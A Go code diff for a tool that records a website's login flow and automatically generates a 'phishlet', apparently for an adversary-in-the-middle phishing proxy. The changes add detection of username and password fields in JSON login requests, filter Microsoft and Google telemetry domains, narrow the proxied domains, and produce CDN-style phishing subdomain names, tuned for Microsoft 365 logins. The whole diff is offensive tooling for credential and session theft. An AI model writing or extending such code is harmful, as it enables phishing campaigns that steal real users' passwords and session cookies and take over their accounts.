@@ -2,6 +2,7 @@ package core
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
 	"math/rand"
 	"net/url"
@@ -88,27 +89,43 @@ type AnalyzerSession struct {
 
 // Known tracking/noise domains to filter out
 var noiseDomains = map[string]bool{
-	"www.google-analytics.com":    true,
-	"analytics.google.com":        true,
-	"www.googletagmanager.com":    true,
-	"googletagmanager.com":        true,
-	"fonts.googleapis.com":        true,
-	"fonts.gstatic.com":           true,
-	"www.gstatic.com":             true,
-	"ssl.gstatic.com":             true,
-	"consent.google.com":          true,
-	"play.google.com":             true,
-	"apis.google.com":             true,
-	"www.facebook.com":            true,
-	"connect.facebook.net":        true,
-	"pixel.facebook.com":          true,
-	"bat.bing.com":                true,
-	"c.bing.com":                  true,
-	"clarity.ms":                  true,
-	"www.clarity.ms":              true,
+	// Google
+	"www.google-analytics.com": true, "analytics.google.com": true,
+	"www.googletagmanager.com": true, "googletagmanager.com": true,
+	"fonts.googleapis.com": true, "fonts.gstatic.com": true,
+	"www.gstatic.com": true, "ssl.gstatic.com": true,
+	"consent.google.com": true, "play.google.com": true,
+	"apis.google.com": true,
+	// Facebook
+	"www.facebook.com": true, "connect.facebook.net": true, "pixel.facebook.com": true,
+	// Bing / Clarity
+	"bat.bing.com": true, "c.bing.com": true, "clarity.ms": true, "www.clarity.ms": true,
+	// Microsoft telemetry / CDN / non-auth services
 	"dc.services.visualstudio.com": true,
-	"browser.events.data.msn.com": true,
-	"ntp.msn.com":                 true,
+	"browser.events.data.msn.com": true, "ntp.msn.com": true,
+	"browser.events.data.microsoft.com": true, "browser.pipe.aria.microsoft.com": true,
+	"res.public.onecdn.static.microsoft": true,
+	"res.cdn.office.net": true, "res-1.cdn.office.net": true, "res-2.cdn.office.net": true,
+	"content.lifecycle.office.net": true, "clients.config.office.net": true,
+	"ecs.office.com": true, "config.edge.skype.com": true,
+	"arc.msn.com": true, "fd.api.iris.microsoft.com": true,
+	"titles.prod.mos.microsoft.com": true, "go.trouter.teams.microsoft.com": true,
+	"loki.delve.office.com": true, "dakg4cmpuclai.cloudfront.net": true,
+	"nam12.safelinks.protection.outlook.com": true, "safelinks.protection.outlook.com": true,
+	"static2.sharepointonline.com": true,
+}
+
+// Noise domain suffix patterns — any domain ending in these is filtered
+var noiseDomainSuffixes = []string{
+	".events.data.microsoft.com",
+	".pipe.aria.microsoft.com",
+	".onecdn.static.microsoft",
+	".cdn.office.net",
+	".lifecycle.office.net",
+	".config.office.net",
+	".safelinks.protection.outlook.com",
+	".trouter.teams.microsoft.com",
+	".prod.mos.microsoft.com",
 }
 
 // Known tracking cookie prefixes to filter out
@@ -434,15 +451,63 @@ func (a *Analyzer) parseCookieHeader(sess *AnalyzerSession, cookieStr string, re
 }
 
 func (a *Analyzer) detectCredentials(sess *AnalyzerSession, postData string, postURL string, postPath string) {
-	// Try URL-encoded form data
+	trimmed := strings.TrimSpace(postData)
+
+	// Try JSON first (Microsoft, Google, and many modern sites use JSON POST bodies)
+	if strings.HasPrefix(trimmed, "{") {
+		a.detectCredentialsJSON(sess, trimmed, postURL, postPath)
+		return
+	}
+
+	// Fall back to URL-encoded form data
 	values, err := url.ParseQuery(postData)
 	if err != nil {
 		return
 	}
 
+	a.checkFieldNames(sess, values, postURL, postPath)
+}
+
+func (a *Analyzer) detectCredentialsJSON(sess *AnalyzerSession, jsonData string, postURL string, postPath string) {
+	// Parse top-level JSON object and check all string keys
+	var obj map[string]interface{}
+	if err := json.Unmarshal([]byte(jsonData), &obj); err != nil {
+		return
+	}
+
+	// Flatten nested JSON keys into a simple key→value map for checking
+	flat := make(url.Values)
+	flattenJSON("", obj, flat)
+
+	a.checkFieldNames(sess, flat, postURL, postPath)
+}
+
+// flattenJSON recursively flattens a JSON object into url.Values for credential detection.
+func flattenJSON(prefix string, obj map[string]interface{}, out url.Values) {
+	for k, v := range obj {
+		key := k
+		if prefix != "" {
+			key = prefix + "." + k
+		}
+		switch val := v.(type) {
+		case string:
+			out.Set(key, val)
+			// Also set the short key (without prefix) for matching
+			out.Set(k, val)
+		case map[string]interface{}:
+			flattenJSON(key, val, out)
+		}
+	}
+}
+
+func (a *Analyzer) checkFieldNames(sess *AnalyzerSession, values url.Values, postURL string, postPath string) {
 	for key := range values {
 		keyLower := strings.ToLower(key)
-		if usernameFields[key] || usernameFields[keyLower] {
+		// Also check the last segment of dotted keys (e.g. "credentials.passwd" → "passwd")
+		keyParts := strings.Split(keyLower, ".")
+		keyShort := keyParts[len(keyParts)-1]
+
+		if usernameFields[key] || usernameFields[keyLower] || usernameFields[keyShort] {
 			sess.creds = append(sess.creds, DetectedCredential{
 				Key:       key,
 				FieldType: "username",
@@ -451,7 +516,7 @@ func (a *Analyzer) detectCredentials(sess *AnalyzerSession, postData string, pos
 			})
 			log.Info("analyzer [%d]: detected username field: %s (POST %s)", sess.Id, key, postPath)
 		}
-		if passwordFields[key] || passwordFields[keyLower] {
+		if passwordFields[key] || passwordFields[keyLower] || passwordFields[keyShort] {
 			sess.creds = append(sess.creds, DetectedCredential{
 				Key:       key,
 				FieldType: "password",
@@ -701,10 +766,10 @@ func (a *Analyzer) Analyze(sess *AnalyzerSession) *AnalysisResult {
 	// Filter domains: remove noise, sort by request count
 	var relevantDomains []*DomainStats
 	for _, ds := range sess.domains {
-		if noiseDomains[ds.Domain] {
+		if isNoiseDomain(ds.Domain) {
 			continue
 		}
-		if ds.RequestCount < 2 {
+		if ds.RequestCount < 3 {
 			continue
 		}
 		relevantDomains = append(relevantDomains, ds)
@@ -714,9 +779,23 @@ func (a *Analyzer) Analyze(sess *AnalyzerSession) *AnalysisResult {
 		return relevantDomains[i].RequestCount > relevantDomains[j].RequestCount
 	})
 
-	// Cap at 10 most relevant domains to keep phishlet manageable
-	if len(relevantDomains) > 10 {
-		relevantDomains = relevantDomains[:10]
+	// Cap at 6 most relevant domains to keep phishlet focused
+	if len(relevantDomains) > 6 {
+		relevantDomains = relevantDomains[:6]
+	}
+
+	// Always include the landing domain even if it was below threshold
+	landingIncluded := false
+	for _, ds := range relevantDomains {
+		if ds.Domain == landingDomain {
+			landingIncluded = true
+			break
+		}
+	}
+	if !landingIncluded && landingDomain != "" {
+		if ds, ok := sess.domains[landingDomain]; ok {
+			relevantDomains = append([]*DomainStats{ds}, relevantDomains...)
+		}
 	}
 
 	// Generate proxy_hosts with CDN-style phish_sub names
@@ -949,26 +1028,30 @@ func (a *Analyzer) GetStatusSummary(sess *AnalyzerSession) string {
 	sb.WriteString(fmt.Sprintf("Recording login flow for: %s\n", sess.TargetURL))
 	sb.WriteString(fmt.Sprintf("Duration: %s\n", elapsed))
 	sb.WriteString(fmt.Sprintf("Status: %s\n", sess.Status))
-	sb.WriteString(fmt.Sprintf("Domains captured: %d\n", len(sess.domains)))
-
-	// Sort domains by request count
+	// Sort domains by request count, filtering noise
 	type domainRow struct {
 		name     string
 		requests int
 		cookies  int
+		noise    bool
 	}
 	var rows []domainRow
+	relevantCount := 0
 	for _, ds := range sess.domains {
-		if noiseDomains[ds.Domain] {
-			continue
+		noise := isNoiseDomain(ds.Domain)
+		if !noise {
+			relevantCount++
 		}
-		rows = append(rows, domainRow{ds.Domain, ds.RequestCount, len(ds.CookieNames)})
+		if !noise && ds.RequestCount >= 2 {
+			rows = append(rows, domainRow{ds.Domain, ds.RequestCount, len(ds.CookieNames), false})
+		}
 	}
 	sort.Slice(rows, func(i, j int) bool {
 		return rows[i].requests > rows[j].requests
 	})
+	sb.WriteString(fmt.Sprintf("Relevant domains: %d (of %d total, noise filtered)\n", relevantCount, len(sess.domains)))
 	for _, r := range rows {
-		sb.WriteString(fmt.Sprintf("  %-40s — %d requests, %d cookies\n", r.name, r.requests, r.cookies))
+		sb.WriteString(fmt.Sprintf("  %-45s — %d requests, %d cookies\n", r.name, r.requests, r.cookies))
 	}
 
 	// Show detected credentials
@@ -1045,6 +1128,19 @@ func generatePhishSub(used map[string]bool) string {
 }
 
 // isNoiseCookie returns true if the cookie name matches known tracking/analytics patterns.
+// isNoiseDomain checks if a domain is a known tracking/telemetry/CDN noise domain.
+func isNoiseDomain(domain string) bool {
+	if noiseDomains[domain] {
+		return true
+	}
+	for _, suffix := range noiseDomainSuffixes {
+		if strings.HasSuffix(domain, suffix) {
+			return true
+		}
+	}
+	return false
+}
+
 func isNoiseCookie(name string) bool {
 	nameLower := strings.ToLower(name)
 	for _, prefix := range noiseCookiePrefixes {
